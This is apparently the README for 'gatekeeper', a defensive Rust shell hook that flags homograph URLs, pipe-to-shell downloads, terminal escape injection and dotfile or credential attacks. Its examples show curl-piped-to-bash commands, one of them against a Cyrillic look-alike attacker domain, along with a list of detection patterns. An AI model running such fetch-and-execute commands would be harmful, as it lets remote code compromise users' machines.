# gatekeeper

[![CI](https://github.com/laikadoggirl/gatekeeper/actions/workflows/ci.yml/badge.svg)](https://github.com/laikadoggirl/gatekeeper/actions/workflows/ci.yml)
[![License: AGPL-3.0](https://img.shields.io/badge/license-AGPL--3.0-blue)](LICENSE-AGPL)

Your browser would catch this. Your terminal won't.

---

Can you spot the difference?

```
  curl -sSL https://install.example-cli.dev | bash     # safe
  curl -sSL https://іnstall.example-clі.dev | bash     # compromised
```

You can't. Neither can your terminal. Both `і` characters are Cyrillic (U+0456), not Latin `i`. The second URL resolves to an attacker's server. The script executes before you notice.

Browsers solved this years ago. Terminals still render Unicode, ANSI escapes, and invisible characters without question.

Gatekeeper stands at the gate.

```bash
cargo install gatekeeper && eval "$(gatekeeper init)"
```

Every command you run is now guarded. Zero friction on clean input. You forget it's there until it saves you.

---

## See it work

Homograph attack — blocked before execution:

```
$ curl -sSL https://іnstall.example-clі.dev | bash

gatekeeper: BLOCKED
  [CRITICAL] non_ascii_hostname — Cyrillic і (U+0456) in hostname
    This is a homograph attack. The URL visually mimics a legitimate
    domain but resolves to a completely different server.
  Bypass: prefix your command with GATEKEEPER=0 (applies to that command only)
```

Pipe-to-shell with clean URL — warned, not blocked:

```
$ curl -fsSL https://get.docker.com | sh

gatekeeper: WARNING
  [MEDIUM] pipe_to_interpreter — Download piped to interpreter
    Consider downloading first and reviewing.
```

Normal commands — invisible:

```
$ git status
$ ls -la
$ docker compose up -d
```

Nothing prints. Zero overhead on clean input.

---

## What it catches

30+ rules across 7 categories. All analysis is local. No network calls.

- Homograph attacks: Cyrillic/Greek lookalikes in hostnames, punycode domains, mixed-script labels
- Terminal injection: ANSI escape sequences that rewrite your display, bidi overrides that reverse text, zero-width characters that hide in domains
- Pipe-to-shell: `curl | bash`, `wget | sh`, `python <(curl ...)`, `eval $(wget ...)` — every source-to-sink pattern
- Dotfile attacks: Downloads targeting `~/.bashrc`, `~/.ssh/authorized_keys`, `~/.gitconfig` — blocked, not just warned
- Insecure transport: Plain HTTP piped to shell, `curl -k`, disabled TLS verification
- Ecosystem threats: Git clone typosquats, untrusted Docker registries, pip/npm URL installs
- Credential exposure: `http://user:pass@host` userinfo tricks, shortened URLs hiding destinations

---

## Install (Rust-only)

Requires Rust and cargo.

```bash
cargo install gatekeeper
```

Activate in your shell profile (`.zshrc`, `.bashrc`, or `config.fish`):

```bash
eval "$(gatekeeper init)"
```

Supported shells:

- zsh — preexec + paste widget
- bash — enter and preexec modes
- fish — key-binding integration
- PowerShell — PSReadLine handler

---

## Commands

- gatekeeper check -- <cmd> — analyze a command without executing it
- gatekeeper paste — analyze pasted content (called by hook)
- gatekeeper score <url> — break down a URL’s trust signals
- gatekeeper diff <url> — show where suspicious characters hide
- gatekeeper run <url> — safe script download/review/execute (unix)
- gatekeeper receipt {last,list,verify} — receipt management
- gatekeeper why — explain the last triggered rule
- gatekeeper init — print shell hook for activation
- gatekeeper doctor — diagnostics

Examples:

```bash
$ gatekeeper check -- curl -sSL https://іnstall.example-clі.dev \| bash
$ gatekeeper score https://bit.ly/something
$ gatekeeper diff https://exаmple.com
$ gatekeeper run https://get.docker.com
$ gatekeeper receipt last
```

---

## Configuration

Gatekeeper uses a YAML policy file. Discovery order (preferred first):

1. `.gatekeeper/policy.yaml` in current directory or repo root (walk up)
2. `~/.config/gatekeeper/policy.yaml`

Legacy compatibility: `.tirith/` and `~/.config/tirith/` are still read if the gatekeeper paths are missing. Prefer the new locations.

```yaml
version: 1
allowlist:
  - "get.docker.com"
  - "sh.rustup.rs"

severity_overrides:
  docker_untrusted_registry: CRITICAL

fail_mode: open  # or "closed" for strict environments
```

More examples: docs/cookbook.md

Bypass for the rare case you know exactly what you're doing:

```bash
GATEKEEPER=0 curl -L https://something.xyz | bash
```

This is a standard per-command prefix — it applies only to that single command and does not persist in your session. Organizations can disable this entirely with `allow_bypass: false` in policy. Legacy `TIRITH=0` is also honored for compatibility.

---

## Data handling

Local JSONL audit log at `~/.local/share/gatekeeper/log.jsonl`:

- Timestamp, action, rule ID, redacted command preview
- No full commands, environment variables, or file contents

Disable logging: `export GATEKEEPER_LOG=0` (legacy `TIRITH_LOG=0` also works)

---

## Compatibility and Stability

- Exit codes: 0 Allow, 1 Block, 2 Warn
- JSON schema version: 2 (additive only)
- Pretty printed human output is TTY-aware; use `GATEKEEPER_PRETTY=0/1` (legacy `TIRITH_PRETTY` supported)

See docs/compatibility.md for details.

---

## Docs

- docs/threat-model.md
- docs/cookbook.md
- docs/troubleshooting.md
- docs/compatibility.md
- SECURITY.md
- docs/uninstall.md

## License

Gatekeeper is dual-licensed:

- AGPL-3.0-only: LICENSE-AGPL — free under copyleft terms
- Commercial: LICENSE-COMMERCIAL — alternative licensing available

Third-party data attributions in NOTICE.
